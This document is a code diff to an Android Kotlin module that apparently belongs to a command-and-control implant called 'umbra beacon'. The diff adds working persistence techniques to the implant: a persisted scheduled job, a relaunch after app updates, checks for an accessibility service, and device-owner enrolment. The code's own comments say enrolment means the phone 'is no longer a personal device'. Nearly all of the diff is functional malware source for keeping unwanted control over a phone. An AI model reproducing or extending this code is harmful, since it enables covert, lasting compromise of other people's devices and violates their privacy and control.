@@ -2,9 +2,13 @@ package io.umbra.beacon
 
 import android.app.AlarmManager
 import android.app.PendingIntent
+import android.app.admin.DevicePolicyManager
+import android.app.job.JobInfo
+import android.app.job.JobScheduler
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.provider.Settings
 import java.io.File
 
 /**
@@ -36,6 +40,10 @@ object Persistence {
         Technique("boot_receiver", "Boot completed receiver", "boot", false, 8),
         Technique("foreground_service", "Sticky foreground service", "service", false, 6),
         Technique("alarm", "Alarm manager entry", "schedule", false, 7),
+        Technique("jobscheduler", "Job scheduler entry", "schedule", false, 7),
+        Technique("app_update", "Re-launch on application update", "update", false, 8),
+        Technique("accessibility", "Accessibility service", "service", false, 4),
+        Technique("device_owner", "Device owner enrolment", "boot", true, 2),
     )
 
     /** The file the state is kept in. */
@@ -107,12 +115,42 @@ object Persistence {
                 "installed", now,
             )
 
+            "jobscheduler" -> Entry(
+                tech.id, label.ifEmpty { "job" }, tech.trigger,
+                "io.umbra.beacon/.UmbraJobService", "the job scheduler wakes the service",
+                "installed", now,
+            )
+
+            "app_update" -> Entry(
+                tech.id, label.ifEmpty { "update" }, tech.trigger,
+                "io.umbra.beacon/.UpdateReceiver", "the implant starts again after an update",
+                "installed", now,
+            )
+
+            "accessibility" -> Entry(
+                tech.id, label.ifEmpty { "accessibility" }, tech.trigger,
+                UmbraAccessibilityService.COMPONENT,
+                "the operator has to enable it in the settings of Android: it is visible to the user",
+                "installed", now,
+            )
+
+            "device_owner" -> Entry(
+                tech.id, label.ifEmpty { "device owner" }, tech.trigger,
+                UmbraAdminReceiver.COMPONENT,
+                "the phone is enrolled to the implant: it is no longer a personal device",
+                "installed", now,
+            )
+
             else -> return Report("persist: ${tech.id} is not a phone technique\n", existing, 0, existing.size.toLong())
         }
         val error = when (tech.id) {
             "boot_receiver" -> enable(context, "io.umbra.beacon", ".BootReceiver", true)
             "foreground_service" -> enable(context, "io.umbra.beacon", ".BeaconService", true)
             "alarm" -> arm(context, true)
+            "jobscheduler" -> scheduleJob(context, true)
+            "app_update" -> enable(context, "io.umbra.beacon", ".UpdateReceiver", true)
+            "accessibility" -> null
+            "device_owner" -> deviceOwner(context, true)
             else -> null
         }
         if (error != null) {
@@ -139,6 +177,10 @@ object Persistence {
                 "boot_receiver" -> enable(context, "io.umbra.beacon", ".BootReceiver", false)
                 "foreground_service" -> enable(context, "io.umbra.beacon", ".BeaconService", false)
                 "alarm" -> arm(context, false)
+                "jobscheduler" -> scheduleJob(context, false)
+                "app_update" -> enable(context, "io.umbra.beacon", ".UpdateReceiver", false)
+                "accessibility" -> null
+                "device_owner" -> deviceOwner(context, false)
                 else -> "unknown technique"
             }
             if (error != null) {
@@ -176,6 +218,10 @@ object Persistence {
                 "boot_receiver" -> isEnabled(context, "io.umbra.beacon", ".BootReceiver")
                 "foreground_service" -> isEnabled(context, "io.umbra.beacon", ".BeaconService")
                 "alarm" -> isArmed(context)
+                "jobscheduler" -> isJobScheduled(context)
+                "app_update" -> isEnabled(context, "io.umbra.beacon", ".UpdateReceiver")
+                "accessibility" -> isAccessibilityEnabled(context)
+                "device_owner" -> isDeviceOwner(context)
                 else -> false
             }
             // The entry is a value: the state is a new value, not a field to
@@ -359,6 +405,91 @@ object Persistence {
             null
         } catch (t: Throwable) {
             t.message ?: "the alarm could not be changed"
+        }
+    }
+
+    /** Schedule or cancel the periodic job of the implant. */
+    private fun scheduleJob(context: Context?, on: Boolean): String? {
+        if (context == null) return "no context"
+        return try {
+            val scheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as? JobScheduler
+                ?: return "the job scheduler is not there"
+            if (!on) {
+                scheduler.cancel(UmbraJobService.JOB_ID)
+                return null
+            }
+            val info = JobInfo.Builder(
+                UmbraJobService.JOB_ID,
+                ComponentName(context, UmbraJobService::class.java),
+            )
+                .setPeriodic(UmbraJobService.JOB_INTERVAL_MS)
+                .setPersisted(true)
+                .build()
+            if (scheduler.schedule(info) == JobScheduler.RESULT_FAILURE) {
+                "the job scheduler refused the job"
+            } else {
+                null
+            }
+        } catch (t: Throwable) {
+            t.message ?: "the job could not be scheduled"
+        }
+    }
+
+    /** Whether the periodic job is still scheduled. */
+    private fun isJobScheduled(context: Context?): Boolean {
+        if (context == null) return false
+        return try {
+            val scheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as? JobScheduler
+                scheduler != null && scheduler.allPendingJobs.any { it.id == UmbraJobService.JOB_ID }
+        } catch (t: Throwable) {
+            false
+        }
+    }
+
+    /**
+     * Whether the user enabled the accessibility service.
+     *
+     * The implant cannot enable it: Android asks the user, and the answer
+     * is in the secure settings of the phone.
+     */
+    private fun isAccessibilityEnabled(context: Context?): Boolean {
+        if (context == null) return false
+        return try {
+            val enabled = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
+            )
+            enabled != null && enabled.contains(UmbraAccessibilityService.COMPONENT)
+        } catch (t: Throwable) {
+            false
+        }
+    }
+
+    /** Enrol the phone to the implant, or give the enrolment back. */
+    private fun deviceOwner(context: Context?, on: Boolean): String? {
+        if (context == null) return "no context"
+        return try {
+            val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                ?: return "the device policy manager is not there"
+            if (!on) {
+                manager.clearDeviceOwnerApp()
+                return null
+            }
+            manager.setDeviceOwner(ComponentName(context, UmbraAdminReceiver::class.java), "umbra")
+            null
+        } catch (t: Throwable) {
+            "the phone refused the device owner: ${t.message ?: "the application has to be pushed as the owner first"}"
+        }
+    }
+
+    /** Whether the phone is enrolled to the implant. */
+    private fun isDeviceOwner(context: Context?): Boolean {
+        if (context == null) return false
+        return try {
+            val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                manager != null && manager.isDeviceOwnerApp
+        } catch (t: Throwable) {
+            false
         }
     }
 
